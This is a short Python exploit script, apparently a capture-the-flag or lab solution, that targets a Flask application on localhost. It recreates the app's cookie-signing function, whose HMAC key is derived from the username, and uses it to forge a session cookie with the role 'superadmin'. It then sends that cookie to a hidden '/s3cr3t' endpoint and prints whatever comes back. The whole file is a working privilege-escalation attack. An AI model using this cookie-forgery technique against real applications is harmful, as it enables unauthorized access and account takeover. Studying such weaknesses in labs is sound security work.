import requests
import base64
import hmac
import hashlib
import json

# Target URL of the Flask application
BASE_URL = "http://127.0.0.1:5000"

def create_session(data: dict, username: str) -> str:
    """Replicate the create_session function from the Flask app."""
    key = b"user_" + username.encode()
    raw = str(data).encode()
    sig = hmac.new(key, raw, hashlib.sha256).hexdigest()
    session = base64.urlsafe_b64encode(raw + b"." + sig.encode()).decode()
    return session

def register_user(username: str, password: str) -> requests.Response:
    """Register a user with the given username and password."""
    data = {"username": username, "password": password}
    response = requests.post(f"{BASE_URL}/register", data=data, allow_redirects=False)
    return response

def exploit():
    # # Step 1: Register a user with username 'admin'
    username = "admin"
    password = "password123"  # Arbitrary password
    # print(f"[*] Registering user '{username}'...")
    # response = register_user(username, password)
    
    # if response.status_code == 302:
    #     print(f"[+] Successfully registered user '{username}'")
    # elif "User already exists" in response.text:
    #     print(f"[*] User '{username}' already exists, proceeding...")
    # else:
    #     print(f"[-] Registration failed: {response.text}")
    #     return

    # Step 2: Forge a session cookie with role 'superadmin'
    session_data = {"username": username, "role": "superadmin"}
    forged_cookie = create_session(session_data, username)
    print(f"[+] Forged session cookie: {forged_cookie}")

    # Step 3: Send request to /s3cr3t with forged cookie
    cookies = {"session": forged_cookie}
    print(f"[*] Accessing /s3cr3t with forged cookie...")
    response = requests.get(f"{BASE_URL}/s3cr3t", cookies=cookies)

    # Check if access was granted
    if response.status_code == 200 and "Superadmins only" not in response.text:
        print(f"[+] Exploit successful! Accessed /s3cr3t:")
        print(response.text)
    else:
        print(f"[-] Exploit failed: {response.text}")

if __name__ == "__main__":
    exploit()